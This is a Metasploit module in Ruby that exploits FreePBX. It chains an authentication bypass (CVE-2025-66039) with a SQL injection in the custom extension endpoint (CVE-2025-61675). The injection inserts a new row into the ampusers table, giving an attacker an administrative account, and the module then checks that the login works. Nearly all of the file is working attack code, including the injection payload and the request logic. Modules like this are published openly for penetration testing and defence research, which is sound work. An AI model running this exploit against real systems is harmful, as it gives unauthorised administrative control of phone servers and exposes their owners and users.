##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FreePBX Custom Extension SQL Injection',
        'Description' => %q{
          FreePBX versions prior to 16.0.44,16.0.92 and 17.0.23,17.0.6 are vulnerable to multiple CVEs, specifically CVE-2025-66039 and CVE-2025-61675, in the context of this module. The versions before 16.0.44 and 17.0.23 are vulnerable to CVE-2025-66039, while versions before 16.0.92 and 17.0.6 are vulnerable to CVE-2025-61675. The former represents an authentication bypass: when FreePBX uses Webserver Authorization Mode (an option the admin can enable), it allows an attacker to authenticate as any user. The latter CVE describes multiple SQL injections; this module exploits the SQL injection in the custom extension component. The module chains these vulnerabilities into an unauthenticated SQL injection attack that creates a new administrative user.
        },
        'Author' => [
          'Noah King', # research
          'msutovsky-r7', # module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2025-66039'], # Authentication Bypass
          [ 'CVE', '2025-61675'], # SQL injections
          [ 'URL', 'https://horizon3.ai/attack-research/the-freepbx-rabbit-hole-cve-2025-66039-and-others/']
        ],
        'DisclosureDate' => '2025-12-11',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options([
      OptString.new('USERNAME', [true, 'A valid FreePBX user']),
      OptString.new('NEW_USERNAME', [false, 'Username for inserted user']),
      OptString.new('NEW_PASSWORD', [false, 'Password for inserted user']),
    ])
  end

  def sql_injection(payload)
    send_request_cgi({
      'uri' => normalize_uri('admin', 'config.php'),
      'method' => 'POST',
      'headers' => {
        'Authorization' => basic_auth(datastore['USERNAME'], Rex::Text.rand_text_alphanumeric(6))
      },
      'vars_get' => {
        'display' => 'endpoint',
        'view' => 'customExt'
      },
      'vars_post' => {
        'id' => payload
      }
    })
  end

  def check
    res = sql_injection(%('))
    if res&.code == 500
      return Exploit::CheckCode::Vulnerable('Detected SQL injection with authentication bypass')
    end

    Exploit::CheckCode::Safe('No SQL injection detected, target is patched')
  end

  def run
    username = datastore['NEW_USERNAME'] || Rex::Text.rand_text_alphanumeric(rand(4..10))
    password = datastore['NEW_PASSWORD'] || Rex::Text.rand_text_alphanumeric(rand(6..12))

    print_status('Trying to create new administrative user')
    res = custom_extension_injection(username, Digest::SHA1.hexdigest(password))

    fail_with(Failure::PayloadFailed, 'Failed to create administrative user') unless res&.code == 401

    if valid_admin_creds?(username, password)
      print_good("New admin account: #{username}/#{password}")
    else
      print_error('Failed to create new user')
    end
  end

  def valid_admin_creds?(username, password)
    res = send_request_cgi({
      'uri' => normalize_uri('admin', 'ajax.php'),
      'method' => 'POST',
      'vars_get' => {
        'module' => 'userman',
        'command' => 'checkPasswordReminder'
      },
      'headers' => { Referer: full_uri(normalize_uri('admin', 'config.php')) },
      'vars_post' => {
        'username' => username,
        'password' => Rex::Text.encode_base64(password),
        'loginpanel' => 'admin'
      }
    })

    return false unless res&.code == 200

    json_data = res.get_json_document

    return false unless json_data['status'] == true && json_data['message'] == '' && json_data['usertype'] == 'admin'

    true
  end

  def custom_extension_injection(username, password_digest)
    sql_injection(%<1';INSERT INTO ampusers (username, password_sha1, sections) VALUES ('#{username}', '#{password_digest}', '*')#>)
  end

end
